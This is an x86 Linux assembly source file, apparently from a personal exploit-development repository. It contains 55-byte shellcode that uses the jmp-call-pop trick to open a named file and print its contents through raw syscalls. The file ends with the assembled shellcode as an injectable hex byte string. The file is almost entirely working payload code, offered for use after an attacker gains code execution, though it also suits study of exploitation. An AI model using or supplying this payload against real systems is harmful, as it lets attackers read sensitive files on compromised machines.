#Author: Natsu
#Github: https://github.com/natsu2912
#Shellcode for reading file in x86 Linux OS
#Length: 55 bytes + file_name

# zero out 4 neccessary register 
_start: 
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	jmp two

# open file 'filename', then call read
one: 
	pop ebx
	movb al, 0x5 # sys_open
	int 0x80 #sys_open('filename', 0), 0 for RD_ONLY, 1 for WR_ONLY, 2 for RD_WR

	mov esi, eax

read:
	movb al, 0x3 # sys_read
	mov ebx, esi # move fd to ebx
	lea ecx, [esp]
	movb dl, 0x1 #read 1 byte
	int 0x80

	# If (read null byte (\x00) or error)
		# exit
	xor ebx, ebx
	cmp eax, ebx
	jle exit
	# else
		# write this byte (character)
write:
	movb al, 0x4 # sys_write
	movb bl, 0x1 # write 1 byte
	movb dl, 0x1
	int 0x80 #now, ecx is still [esp], no need to assign 1 more time => save memory

	jmp read # This instruction causes loop until we read null byte

exit:
	movb al, 0x1 # sys_exit
	xor ebx, ebx # sys_exit(0)
	int 0x80



two: #purpose: add parameter 'file_name' at the end of shellcode
	call one
	.string "file_name"

#SHELLCODE = "\x31\xC0\x31\xDB\x31\xC9\x31\xD2\xEB\x28\x5B\xB0\x05\xCD\x80\x89\xC6\xB0\x03\x89\xF3\x8D\x0C\x24\xB2\x01\xCD\x80\x31\xDB\x39\xD8\x7E\x0A\xB0\x04\xB3\x01\xB2\x01\xCD\x80\xEB\xE5\xB0\x01\x31\xDB\xCD\x80\xE8\xD3\xFF\xFF\xFF" + "file_name"